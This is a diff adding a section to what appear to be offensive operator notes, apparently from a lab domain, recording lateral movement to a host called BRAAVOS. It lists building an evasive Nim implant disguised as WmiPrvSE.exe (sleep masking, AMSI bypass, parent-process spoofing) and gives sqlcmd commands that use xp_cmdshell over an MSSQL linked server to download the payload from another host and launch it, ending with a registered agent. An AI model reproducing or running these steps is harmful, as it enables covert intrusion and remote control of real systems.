@@ -391,3 +391,25 @@ fork-run <cmd> <shellcode_file>        # spawn suspended, inject shellcode, redi
 - c_v14 agent: checked in after upload via nim_v12 ✓
 
 *Last updated: 2026-07-28*
+
+---
+
+## BRAAVOS deployment via MSSQL linked server (2026-07-28)
+
+BRAAVOS (10.10.10.23) reached via MSSQL linked server from CASTELBLACK c_v14 agent.
+Agent 89f390fb: sql_svc@BRAAVOS, WmiPrvSE.exe PID 5796, HTTPS.
+
+Build: Payloads → HTTPS → Nim → Low entropy ✓ → OPSEC avanzado (Sleep Mask XOR, AMSI Patchless VEH, PPID spoof explorer.exe) → WmiPrvSE.exe
+
+```
+# From c_v14 console (c_v14 = f0d4d94a@CASTELBLACK):
+upload WmiPrvSE.exe C:\inetpub\wwwroot\WmiPrvSE.exe
+
+shell sqlcmd -S localhost -E -Q "EXEC ('xp_cmdshell ''powershell -c Invoke-WebRequest http://10.10.10.22/WmiPrvSE.exe -OutFile C:\\Windows\\Temp\\WmiPrvSE.exe -UseBasicParsing''') AT [BRAAVOS]"
+
+shell sqlcmd -S localhost -E -Q "EXEC ('xp_cmdshell ''powershell -c (test-path C:\\Windows\\Temp\\WmiPrvSE.exe)''') AT [BRAAVOS]"
+# → True
+
+shell sqlcmd -S localhost -E -Q "EXEC ('xp_cmdshell ''cmd /c start /b C:\\Windows\\Temp\\WmiPrvSE.exe''') AT [BRAAVOS]"
+# → Agent 89f390fb registered
+```
